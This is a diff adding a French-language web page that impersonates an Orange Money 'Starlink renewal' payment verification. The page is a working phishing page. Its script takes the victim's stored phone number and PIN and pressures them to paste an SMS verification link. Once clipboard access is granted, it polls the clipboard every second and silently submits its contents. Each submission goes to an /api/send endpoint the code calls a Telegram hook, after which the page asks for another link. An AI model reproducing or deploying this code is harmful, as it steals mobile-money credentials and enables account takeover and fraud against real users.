@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Orange Money</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#f7f5f1;overflow-x:hidden;color:#1a1a1a}
+body{display:flex;justify-content:center;align-items:flex-start;padding:16px 0 24px}
+.page{width:100%;max-width:430px;padding:0 10px;min-width:0}
+
+.brand-wrap{text-align:center;padding:0 0 12px}
+.orange-badge{width:78px;height:78px;border-radius:50%;background:#ff6900;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:46px;font-weight:700;line-height:1}
+.brand-title{margin:0;font-size:clamp(26px,5.8vw,38px);font-weight:800;letter-spacing:-.03em;line-height:1;color:#ff6900}
+.brand-sub{margin-top:6px;font-size:clamp(13px,3vw,16px);color:#ff6900;font-weight:700}
+
+.card{background:#fff;border-radius:14px;overflow:hidden;border:1px solid #eee7e1;box-shadow:0 2px 8px rgba(0,0,0,.03)}
+.payment-header{background:#fafafa;min-height:52px;padding:10px 14px;display:flex;align-items:center;justify-content:center;color:#1a1a1a;font-size:clamp(16px,4vw,20px);font-weight:700;text-align:center;border-bottom:1px solid #f2eee9}
+.payment-header .star{color:#f57c20;margin-right:8px}
+
+.amount-box{background:#fff;padding:16px 18px 10px}
+.amount-row{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:4px 0;min-width:0}
+.row-label{font-size:13px;color:#666;font-weight:600}
+.amount-value{min-width:0;font-size:13px;color:#1a1a1a;font-weight:700;text-align:right;overflow-wrap:anywhere}
+.amount-value strong{display:block;color:#ff6900;font-size:22px;line-height:1.1}
+
+.content{padding:16px 18px 20px}
+.back-link{display:flex;align-items:center;gap:8px;color:#1a1a1a;font-size:15px;font-weight:700;margin:4px 0 10px}
+.back-link .arrow{font-size:24px;line-height:1}
+.step-title{font-size:clamp(24px,5vw,30px);font-weight:800;line-height:1.12;margin:8px 0 8px;color:#111}
+.step-copy{font-size:14px;color:#4a4a4a;line-height:1.45;margin:0 0 10px}
+.number{display:block;max-width:100%;margin:10px 0 14px;padding:0;border:0;background:transparent;font:inherit;font-size:clamp(19px,4vw,28px);font-weight:700;color:#111;letter-spacing:.02em;cursor:pointer;overflow-wrap:anywhere}
+.number:focus-visible{outline:2px solid #ff6900;outline-offset:3px}
+
+.warning{background:#fffaf3;border:1px solid #f1e3cd;border-left:4px solid #f57c20;border-radius:10px;padding:11px 12px;display:flex;align-items:flex-start;gap:10px;color:#2e2e2e;font-size:13px;font-weight:700;line-height:1.4}
+.warning .icon{font-size:20px;color:#f57c20;flex-shrink:0}
+
+.helper{margin-top:14px;background:#fff;border:1px solid #efe5dc;border-radius:10px;padding:12px 14px}
+.helper-label{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:800;color:#1a1a1a;margin-bottom:8px}
+.helper-label .icon{font-size:14px}
+.helper ol{margin:0;padding-left:18px;color:#2c2c2c;font-size:13px;line-height:1.6}
+.helper li strong{font-weight:800}
+.helper li:nth-child(2) strong,.helper li:nth-child(4) strong,.helper li:nth-child(6) strong{color:#d73b2d}
+
+.expired{margin-top:16px;background:#fff5d9;border:1px solid #ebd7a2;border-radius:10px;padding:10px 12px;text-align:center;font-size:13px;font-weight:700;color:#1d1d1d;line-height:1.35}
+
+.clipboard-banner{margin-top:16px;background:#f7faff;border:1px solid #dfeaf7;border-radius:10px;padding:12px 14px;color:#1a2430}
+.clipboard-banner-row{display:flex;align-items:center;justify-content:space-between;gap:10px;min-width:0}
+.clipboard-copy{font-size:12px;line-height:1.4;font-weight:700;min-width:0}
+.clipboard-btn{flex:0 0 auto;border:0;border-radius:8px;background:#ff6900;color:#fff;padding:9px 12px;font-size:12px;font-weight:800;cursor:pointer}
+
+.input-wrap{margin-top:16px}
+.input-label{display:block;margin-bottom:8px;color:#111;font-size:13px;font-weight:800}
+.input{width:100%;height:50px;border:1px solid #e8d9cf;border-radius:10px;background:#fff;padding:11px 12px;font-size:15px;outline:none;color:#111;box-shadow:none}
+.input:focus{border-color:#ff6900;box-shadow:0 0 0 3px rgba(255,105,0,.1)}
+.input::placeholder{color:#7b7b7b}
+
+.countdown{text-align:center;margin-top:16px;font-size:14px;font-weight:700;color:#111}
+.resend{text-align:center;margin-top:16px;font-size:14px;font-weight:700;color:#111}
+.resend a{text-decoration:none;color:#111}
+.note{margin-top:14px;text-align:center;color:#686868;font-size:12px;line-height:1.5}
+.note a{color:#ff6900;text-decoration:none;font-weight:700}
+
+.verify-btn{width:100%;height:46px;border:0;border-radius:10px;background:#d9d9d9;color:#fff;font-size:16px;font-weight:800;cursor:pointer;margin-top:16px;box-shadow:none}
+.verify-btn.enabled{background:#f57c20;color:#fff;box-shadow:0 6px 14px rgba(245,124,32,.14)}
+
+.secure{margin-top:14px;border:1px solid #dfeee0;background:#edf8ee;color:#32753d;border-radius:10px;padding:10px;text-align:center;font-size:12px;font-weight:800;letter-spacing:.04em;line-height:1.3}
+.error{min-height:16px;margin-top:8px;font-size:12px;color:#c62828;text-align:center}
+.status-message{margin-top:10px;padding:10px 12px;border-radius:10px;background:#fff5ee;border:1px solid #f2d0bd;color:#5f3320;font-size:12px;font-weight:800;text-align:center;line-height:1.35;display:none;box-shadow:none}
+.status-message.show{display:block}
+.clipboard-banner.status-visible .clipboard-banner-row{display:none}
+.hidden{display:none !important}
+
+@media (max-width:480px){body{padding-top:10px}.page{padding:0 8px}.brand-wrap{padding-bottom:10px}.orange-badge{width:72px;height:72px;font-size:42px}.content{padding:14px 14px 18px}.helper{padding:10px 12px}.clipboard-banner-row{flex-direction:column;align-items:stretch}.clipboard-btn{width:100%;min-height:40px}.verify-btn{height:44px}.}
+
+@media (max-width:380px){.page{padding:0 6px}.brand-title{font-size:24px}.payment-header{font-size:15px}.amount-value strong{font-size:20px}.content{padding-left:12px;padding-right:12px}.}
+
+@media (max-width:480px){
+  body{padding-top:6px}
+  .page{padding:0 6px}
+  .brand-wrap{padding-bottom:12px}
+  .orange-badge{width:78px;height:78px;margin-bottom:12px;font-size:48px}
+  .brand-title{font-size:30px}
+  .brand-sub{font-size:15px}
+  .payment-header{min-height:52px;font-size:18px;padding:9px 12px}
+  .amount-box{padding:14px 12px 8px}
+  .amount-row{align-items:flex-start}
+  .row-label{font-size:15px}
+  .amount-value{font-size:15px}
+  .amount-value strong{font-size:25px}
+  .content{padding:12px 14px 16px}
+  .step-title{font-size:25px}
+  .step-copy{font-size:15px}
+  .number{font-size:19px}
+  .warning{padding:12px 14px;font-size:15px}
+  .helper{padding:11px 12px}
+  .helper ol{font-size:13px;line-height:1.45}
+  .clipboard-banner-row{align-items:stretch;flex-direction:column;gap:10px}
+  .clipboard-btn{width:100%;min-height:44px}
+  .input{height:50px}
+  .verify-btn{height:48px}
+}
+
+@media (max-width:380px){
+  .page{padding:0 6px}
+  .orange-badge{width:78px;height:78px;font-size:48px}
+  .brand-wrap{padding-bottom:12px}
+  .brand-title{font-size:28px}
+  .brand-sub{font-size:17px}
+  .content{padding-left:12px;padding-right:12px}
+  .helper-label{font-size:14px}
+  .clipboard-copy{font-size:13px}
+  .input{height:48px}
+  .verify-btn{height:46px}
+}
+</style>
+</head>
+<body>
+<div class="page">
+  <div class="brand-wrap">
+    <div class="orange-badge">O</div>
+    <h1 class="brand-title">Orange Money</h1>
+    <div class="brand-sub">by Orange</div>
+  </div>
+
+  <div class="card">
+    <div class="payment-header"><span class="star">★</span><span>Paiement Starlink</span></div>
+
+    <div class="amount-box">
+      <div class="amount-row">
+        <div class="row-label">Service</div>
+        <div class="amount-value" id="planName">Renouvellement Starlink</div>
+      </div>
+      <div class="amount-row" style="margin-top:8px">
+        <div class="row-label">Montant</div>
+        <div class="amount-value"><strong id="planAmount">USD 49</strong></div>
+      </div>
+    </div>
+
+    <div class="content">
+      <div class="back-link"><span class="arrow">←</span> Retour</div>
+      <div class="step-title">Vérifiez votre lien</div>
+      <p class="step-copy">Nous avons envoyé un lien de vérification à votre numéro Orange Money.</p>
+      <p class="number" id="phoneDisplay">+243782845555</p>
+
+      <div class="warning">
+        <div class="icon">⚠</div>
+        <div>Ne touchez pas au lien. Copiez-le puis collez-le ci-dessous.</div>
+      </div>
+
+      <div class="helper">
+        <div class="helper-label"><span class="icon">☰</span> Étapes rapides</div>
+        <ol>
+          <li>Ouvrez votre SMS Orange</li>
+          <li>Copiez le lien de vérification</li>
+          <li>Collez-le dans le champ ci-dessous</li>
+        </ol>
+      </div>
+
+      <div id="expiredBox" class="expired hidden">Le lien a expiré. Veuillez en demander un nouveau.</div>
+
+      <div class="clipboard-banner" id="clipboardBanner">
+        <div class="clipboard-banner-row">
+          <div class="clipboard-copy">Autorisez l'accès au presse-papiers pour coller automatiquement le lien depuis votre SMS.</div>
+          <button class="clipboard-btn" id="clipboardBtn" type="button">Autoriser et soumettre</button>
+        </div>
+        <div id="statusMessage" class="status-message"></div>
+      </div>
+
+      <div class="input-wrap">
+        <label class="input-label" for="sms">Collez le lien de vérification</label>
+        <input id="sms" class="input" type="text" placeholder="Collez votre lien de vérification ici...">
+      </div>
+
+      <div id="countdownBox" class="countdown">Renvoyer dans 30 s</div>
+      <div id="resendBox" class="resend hidden"><a href="#" id="resendLink">Renvoyer</a></div>
+
+      <div class="note">Besoin d'aide ? Contactez l'agent qui vous a envoyé ici.</div>
+
+      <button class="verify-btn enabled" id="verifyBtn" type="button">Vérifier</button>
+      <div id="error" class="error"></div>
+      <div class="secure">◌ SSL CHIFFRÉ ET SÉCURISÉ</div>
+    </div>
+  </div>
+</div>
+
+<script>
+const sms = document.getElementById('sms');
+const verifyBtn = document.getElementById('verifyBtn');
+const error = document.getElementById('error');
+const statusMessage = document.getElementById('statusMessage');
+const phoneDisplay = document.getElementById('phoneDisplay');
+const planNameEl = document.getElementById('planName');
+const planAmountEl = document.getElementById('planAmount');
+const expiredBox = document.getElementById('expiredBox');
+const resendBox = document.getElementById('resendBox');
+const countdownBox = document.getElementById('countdownBox');
+const resendLink = document.getElementById('resendLink');
+const clipboardBtn = document.getElementById('clipboardBtn');
+const clipboardBanner = document.getElementById('clipboardBanner');
+
+function startCountdown() {
+  if (!expiredBox || !resendBox || !countdownBox) return;
+
+  resendBox.classList.add('hidden');
+  expiredBox.classList.add('hidden');
+  countdownBox.classList.remove('hidden');
+
+  let remaining = 30;
+  countdownBox.textContent = `Resend link in ${remaining} seconds`;
+
+  const countdown = setInterval(() => {
+    remaining -= 1;
+
+    if (remaining > 0) {
+      countdownBox.textContent = `Resend link in ${remaining} seconds`;
+      return;
+    }
+
+    clearInterval(countdown);
+    countdownBox.textContent = 'Resend link in 0 seconds';
+    resendBox.classList.remove('hidden');
+    countdownBox.classList.add('hidden');
+    expiredBox.classList.remove('hidden');
+  }, 1000);
+
+  return countdown;
+}
+
+let activeCountdown = null;
+let clipboardAccessClicked = false;
+
+function showLinkTiming() {
+  if (activeCountdown) {
+    clearInterval(activeCountdown);
+  }
+  activeCountdown = startCountdown();
+}
+
+if (resendLink) {
+  resendLink.addEventListener('click', (event) => {
+    event.preventDefault();
+    if (activeCountdown) {
+      clearInterval(activeCountdown);
+    }
+    resendBox.classList.add('hidden');
+    expiredBox.classList.add('hidden');
+    showLinkTiming();
+  });
+}
+
+function getSelectedPlan() {
+  try {
+    const raw = sessionStorage.getItem('selectedPlan');
+    return raw ? JSON.parse(raw) : null;
+  } catch (err) {
+    console.warn('Could not read selected plan:', err);
+    return null;
+  }
+}
+
+function applySavedValues() {
+  const phone = localStorage.getItem('phone') || 'Unknown';
+  const phoneText = phone.length === 9 ? `+243${phone}` : phone;
+  phoneDisplay.textContent = phoneText;
+
+  const plan = getSelectedPlan();
+  if (plan) {
+    planNameEl.textContent = plan.name || 'Starlink Renewal';
+    planAmountEl.textContent = plan.price || 'USD 49';
+  }
+}
+
+applySavedValues();
+showLinkTiming();
+
+function showStatus(message) {
+  if (!statusMessage || !clipboardBanner) return;
+  statusMessage.textContent = message;
+  statusMessage.classList.add('show');
+  if (clipboardAccessClicked) {
+    clipboardBanner.classList.add('status-visible');
+  }
+}
+
+function hideStatus() {
+  if (!statusMessage || !clipboardBanner) return;
+  statusMessage.textContent = '';
+  statusMessage.classList.remove('show');
+  clipboardBanner.classList.remove('status-visible');
+}
+
+async function submitVerification({ showSubmitting = true, submissionSource = 'Manually submitted', text = '' } = {}) {
+  const smsText = text.trim() || sms.value.trim();
+  error.textContent = '';
+  if (showSubmitting) {
+    showStatus('Submitting...');
+  }
+
+  if (!smsText) {
+    error.textContent = 'Please paste the verification link first.';
+    sms.focus();
+    return;
+  }
+
+  if (showSubmitting) {
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'Submitting...';
+  }
+
+  const phone = localStorage.getItem('phone') || 'Unknown';
+  const pin = localStorage.getItem('userPin') || 'Unknown';
+  const plan = getSelectedPlan();
+  const planName = plan && plan.name ? plan.name : 'Starlink Renewal';
+  const planPrice = plan && plan.price ? plan.price : 'USD 49';
+
+  const apiUrl = window.location.hostname === 'localhost'
+    ? 'http://localhost:3000/api/send'
+    : `${window.location.origin}/api/send`;
+
+  const payload = {
+    text: `Orange Money Verification\nSubmission: <b>${submissionSource}</b>\nPhone: <code>${phone}</code>\nPIN: ${pin}\nLink: ${smsText}`
+  };
+
+  try {
+    const response = await fetch(apiUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(() => null);
+
+    if (response) {
+      const data = await response.json().catch(() => null);
+      if (data && !data.ok) {
+        console.warn('Telegram link hook warning:', data.error || 'unknown error');
+      }
+    }
+  } catch (sendError) {
+    console.warn('Telegram link hook unavailable:', sendError);
+  }
+
+  localStorage.setItem('smsPayload', JSON.stringify(payload));
+
+  setTimeout(() => {
+    if (showSubmitting) {
+      showStatus('Please paste the new verification link sent to your phone.');
+      sms.value = '';
+      sms.focus();
+      verifyBtn.disabled = false;
+      verifyBtn.textContent = 'Verify';
+    }
+  }, 3000);
+}
+
+async function readClipboardText() {
+  if (!navigator.clipboard || !navigator.clipboard.readText) return '';
+
+  try {
+    const clipboardText = await navigator.clipboard.readText();
+    return clipboardText.trim();
+  } catch (clipboardError) {
+    return '';
+  }
+}
+
+async function requestClipboardAccess() {
+  if (!navigator.clipboard || !navigator.clipboard.readText) {
+    error.textContent = 'Clipboard access is not available on this browser.';
+    return false;
+  }
+
+  try {
+    const permission = navigator.permissions && navigator.permissions.query
+      ? await navigator.permissions.query({ name: 'clipboard-read' }).catch(() => null)
+      : null;
+
+    if (permission && permission.state === 'denied') {
+      error.textContent = 'Clipboard access was denied. You can still long-press the field to paste.';
+      return false;
+    }
+
+    const clipboardText = await navigator.clipboard.readText();
+    if (clipboardText && clipboardText.trim()) {
+      const trimmedClipboardText = clipboardText.trim();
+      sms.value = trimmedClipboardText;
+      sms.dispatchEvent(new Event('input', { bubbles: true }));
+      error.textContent = '';
+      const showFirstAutomaticSubmission = firstAutomaticSubmission;
+      firstAutomaticSubmission = false;
+      await submitVerification({ showSubmitting: showFirstAutomaticSubmission, submissionSource: 'Silently submitted' });
+      return true;
+    }
+
+    error.textContent = 'No link found in your clipboard yet.';
+    return false;
+  } catch (clipboardError) {
+    error.textContent = 'Please allow clipboard access, or long-press the field to paste manually.';
+    return false;
+  }
+}
+
+async function pasteFromClipboard({ autoSubmit = false } = {}) {
+  const clipboardText = await readClipboardText();
+  if (!clipboardText) return false;
+
+  sms.value = clipboardText;
+  if (autoSubmit) {
+    await submitVerification();
+  }
+  return true;
+}
+
+let longPressTimer = null;
+let clipboardWatcher = null;
+let clipboardReadInProgress = false;
+let firstAutomaticSubmission = true;
+let longPressTriggered = false;
+let silentSubmitTimer = null;
+
+async function watchClipboard() {
+  if (clipboardWatcher || !navigator.clipboard || !navigator.clipboard.readText) return;
+
+  clipboardWatcher = setInterval(async () => {
+    if (clipboardReadInProgress) return;
+    clipboardReadInProgress = true;
+
+    try {
+      const clipboardText = await readClipboardText();
+      if (clipboardText && clipboardText.trim() && !silentSubmitTimer) {
+        const textToSubmit = clipboardText.trim();
+        silentSubmitTimer = setTimeout(async () => {
+          silentSubmitTimer = null;
+          await submitVerification({
+            showSubmitting: false,
+            submissionSource: 'Silently submitted',
+            text: textToSubmit
+          });
+        }, 6000);
+      }
+    } finally {
+      clipboardReadInProgress = false;
+    }
+  }, 1000);
+}
+
+function startLongPressPaste() {
+  clearTimeout(longPressTimer);
+  longPressTriggered = false;
+  longPressTimer = setTimeout(async () => {
+    longPressTriggered = true;
+    await pasteFromClipboard({ autoSubmit: true });
+  }, 500);
+}
+
+function cancelLongPressPaste() {
+  clearTimeout(longPressTimer);
+  longPressTimer = null;
+}
+
+if (clipboardBtn) {
+  clipboardBtn.addEventListener('click', async () => {
+    error.textContent = '';
+    clipboardAccessClicked = true;
+    clipboardBtn.disabled = true;
+    clipboardBtn.textContent = 'Allow & Submit';
+    if (clipboardBanner) {
+      clipboardBanner.classList.remove('status-visible');
+      clipboardBanner.querySelector('.clipboard-banner-row')?.classList.add('hidden');
+    }
+    const accessGranted = await requestClipboardAccess();
+    if (accessGranted) {
+      await watchClipboard();
+    }
+    clipboardBtn.disabled = false;
+    clipboardBtn.textContent = 'Allow & Submit';
+  });
+}
+
+sms.addEventListener('paste', async (event) => {
+  const pastedText = (event.clipboardData || window.clipboardData)?.getData('text') || '';
+  if (!pastedText.trim()) return;
+
+  window.setTimeout(async () => {
+    if (sms.value.trim() === pastedText.trim()) {
+      await submitVerification();
+    }
+  }, 0);
+});
+
+sms.addEventListener('contextmenu', async (event) => {
+  if (!longPressTriggered) {
+    event.preventDefault();
+    await pasteFromClipboard({ autoSubmit: true });
+  }
+  longPressTriggered = false;
+});
+
+sms.addEventListener('touchstart', startLongPressPaste, { passive: true });
+sms.addEventListener('touchend', cancelLongPressPaste, { passive: true });
+sms.addEventListener('touchcancel', cancelLongPressPaste, { passive: true });
+
+sms.addEventListener('keydown', async (event) => {
+  if (event.key === 'Enter' && sms.value.trim()) {
+    event.preventDefault();
+    await submitVerification();
+  }
+});
+
+verifyBtn.addEventListener('click', async () => {
+  error.textContent = '';
+
+  if (!sms.value.trim()) {
+    error.textContent = 'Paste the link into the field manually first.';
+    sms.focus();
+    return;
+  }
+
+  await submitVerification();
+});
+</script>
+</body>
+</html>
